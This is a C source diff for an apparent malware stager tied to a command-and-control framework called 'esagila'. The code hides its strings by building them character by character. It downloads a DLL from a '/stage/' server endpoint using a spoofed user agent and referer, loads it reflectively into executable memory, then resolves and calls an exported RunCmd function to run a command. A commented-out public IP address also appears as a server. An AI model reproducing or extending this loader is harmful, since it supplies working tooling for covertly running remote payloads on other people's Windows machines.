@@ -51,6 +51,9 @@ typedef BOOL(WINAPI *WINHTTPQUERYHEADERS)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPD
 // shlwapi.dll (StrToIntW)
 typedef DWORD(WINAPI *STRTOINTW)(PCWSTR);
 
+// standard esagila api
+typedef BOOL(WINAPI *RUNCMD)(CHAR* cmd);
+
 #define WINHTTP_NO_ADDITIONAL_HEADERS NULL
 #define WINHTTP_NO_REQUEST_DATA NULL
 #define WINHTTP_QUERY_CONTENT_LENGTH 5
@@ -95,7 +98,11 @@ typedef struct API_ {
     UINT64 printf;
     UINT64 CryptStringToBinaryA;
     UINT64 StrToIntW;
-} API, * PAPI;
+} API, *PAPI;
+
+typedef struct ESG_STD_API_ {
+    UINT64 RunCmd;
+} ESG_STD_API, *PESG_STD_API;
 
 typedef struct DLL_ {
     LPVOID Buffer;
@@ -160,28 +167,28 @@ DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
 }
 
 LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
-    WCHAR wVerb[4] = {
+    WCHAR wVerb[] = {
       'G', 'E', 'T', 0
     };
 
-    WCHAR wEndpoint[8] = {
+    WCHAR wEndpoint[] = {
       '/', 's', 't', 'a', 'g', 'e', '/', 0
     };
 
-    WCHAR wUserAgent[8] = {
+    WCHAR wUserAgent[] = {
       'I', 'm', 'h', 'u', 'l', 'l', 'u', 0
     };
 
-    WCHAR wVersion[5] = {
+    WCHAR wVersion[] = {
       'H', 'T', 'T', 'P', 0
     };
 
-    WCHAR wReferer[19] = {
+    WCHAR wReferer[] = {
     'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0
     };
 
-    WCHAR wUuid[7] = {
-    'a', 'g', 'n', 'n', 't', '1', 0
+    WCHAR wUuid[] = {
+    '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', 0
     };
 
     /*
@@ -195,7 +202,7 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     //WCHAR wServer[14] = {'1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0};
 
     // Host-Only
-    WCHAR wServer[12] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
+    WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
 
     WCHAR wProxy[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0};
     WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','B','Y','P','A','S','S',0};
@@ -494,7 +501,7 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     return rlAddress;
 }
 
-void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
+HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     DWORD loaderOffset;
     REFLECTIVELOADER pReflectiveLoader;
     DLLMAIN pDllMain;
@@ -517,7 +524,7 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     DWORD dwOldProtect;
     ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-    HANDLE hResult = NULL;
+    HANDLE hDllBase = NULL;
 
     pDllMain = (DLLMAIN)pReflectiveLoader();
 
@@ -532,13 +539,13 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     if( pDllMain != NULL )
 	{
 		// call the loaded librarys DllMain to get its HMODULE
-		if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hResult) == FALSE)
+		if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
 		{
 		    #ifdef DEBUG
             CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0};
             ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
             #endif
-		    hResult = NULL;
+		    hDllBase = NULL;
 		}
 	}
     else
@@ -548,6 +555,8 @@ void inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
         ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
         #endif
 	}
+
+    return hDllBase;
 }
 
 void messagebox() {
@@ -639,23 +648,37 @@ void messagebox() {
     api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);
 
     DWORD dwDllSize;
-    LPVOID pRawDll = 0;
+    LPVOID pEsgStdDll = 0;
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
-    while (pRawDll == 0)
+    while (pEsgStdDll == 0)
     {
-        pRawDll = winHTTPClient(api, &dwDllSize);
+        pEsgStdDll = winHTTPClient(api, &dwDllSize);
         ((SLEEP)api->Sleep)(5000);
-        if (pRawDll != 0)
+        if (pEsgStdDll != 0)
         { break; }
         #ifdef DEBUG
         ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
         #endif
     }
 
+    ESG_STD_API EsgStdApi = { 0 };
+    PESG_STD_API PEsgStdApi = &EsgStdApi;
+
     //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
-    inject(api, pRawDll, dwDllSize);
-    ((FREE)api->free)(pRawDll);
+    pEsgStdDll =  inject(api, pEsgStdDll, dwDllSize);
+
+    CHAR runCmd_c[] = {'R', 'u', 'n', 'C', 'm', 'd', 0};
+
+    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
+    CHAR cmd[] = {'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0};
+
+    CHAR format[] = {'%', 's', 0};
+    ((PRINTF)api->printf)(format, runCmd_c);
+
+    ((RUNCMD)PEsgStdApi->RunCmd)(cmd);
+
+    ((FREE)api->free)(pEsgStdDll);
 }
 
